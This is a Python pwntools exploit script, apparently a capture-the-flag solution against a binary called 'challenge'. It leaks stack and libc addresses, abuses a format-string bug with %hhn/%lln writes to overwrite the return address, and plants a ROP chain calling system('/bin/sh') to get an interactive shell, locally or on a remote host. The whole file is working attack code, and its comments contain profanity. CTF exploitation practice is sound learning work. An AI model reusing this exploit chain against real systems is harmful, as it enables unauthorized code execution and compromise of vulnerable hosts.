from pwn import *
import sys

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./challenge"        ### CHANGE ME !!!!!!!!!!!!!!!!

gdbscript = '''
    b *main+151
    b main
    b *vuln+137
'''

def init():
    ## loading custom libc
    env = {"LD_PRELOAD": "./libc.so.6"}
    ## loading custom libc
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)# env=env)
    return pp
# quick notes : [aka memory diving]
# offset 13 .text main+111
# fucking rip offset [17] 
# ebp for vuln is off 12

def splitpepe(x):
    print(x)
    chunks, chunk_size = len(x), len(x)//6
    pepe = [ x[i:i+chunk_size] for i in range(0, chunks, chunk_size) ]
    pepe.pop(0)
    return (pepe[::-1])

def write_in_memo(rip_leak, pepe):
    address = int(rip_leak, 16)
    addr = splitpepe(pepe)
    zbi = ["%{}c%8$lln", "%{}c%8$hhn", "%{}c%8$hhn", "%{}c%8$hhn", "%{}c%8$hhn", "%{}c%8$hhn"]
    for i in range(0, 6):
        pp.recvuntil(b">>")
        pp.sendline(b"2")
        pp.recvuntil(b">>")
        formats = zbi[i].format(int(addr[i], 16)).encode()
        formats += b"A" * (16 -len(formats))
        payload = formats + p64(int(rip_leak, 16) + i)
        print(payload)
        pp.sendline(payload)

def exploit(pp):
    pp.recvuntil(b">> ")
    pp.sendline(b"1")
    leaks = pp.recvline().rstrip().decode().split(' ')
    libc.address = int(leaks[1], 16) - libc.sym.fgets
    rip_leak = int(leaks[0], 16) + 56
    offset = 6
    # for i in range(1, 40):
    #     pp.recvuntil(b">>")
    #     pp.sendline(b"2")
    #     pp.recvuntil(b">>")
    #     formatd = f"%{i}$llX"
    #     pp.sendline(formatd.encode())
    #     dump = int(pp.recvline().rstrip().decode(), 16)
    #     print(f"{hex(dump)} [{i}]")
    ############################ GADGETS ##########################
    libcrop = ROP(libc)
    pop_rdi = libcrop.find_gadget(["pop rdi", "ret"]).address
    ret = libcrop.find_gadget(["ret"]).address
    bin_sh = next(libc.search(b"/bin/sh\x00"))
    log.info(f"fucking gadgets \npopRDI : {hex(pop_rdi)}\n/bin/sh :{hex(bin_sh)}\nsystem :{hex(libc.sym.system)}\nFUCKing RIP LEAk {hex(rip_leak)}\nfucking stack_leak {leaks[0]}") 
    ###############################################################
    write_in_memo(str(hex(rip_leak)).encode(), str(hex(pop_rdi)).encode())
    write_in_memo(str(hex(rip_leak + 8)).encode(), str(hex(bin_sh)).encode())
    write_in_memo(str(hex(rip_leak + 16)).encode(), str(hex(ret)).encode())
    write_in_memo(str(hex(rip_leak + 24)).encode(), str(hex(libc.sym.system)).encode())
    pp.recvuntil(b">>")
    pp.sendline(b"3")
    pp.interactive()

libc = ELF("./libc.so.6")
# libc = ELF("/usr/lib/libc.so.6")                            ## fucking temporary library
elf = context.binary = ELF(binary)
pp = init()
exploit(pp)
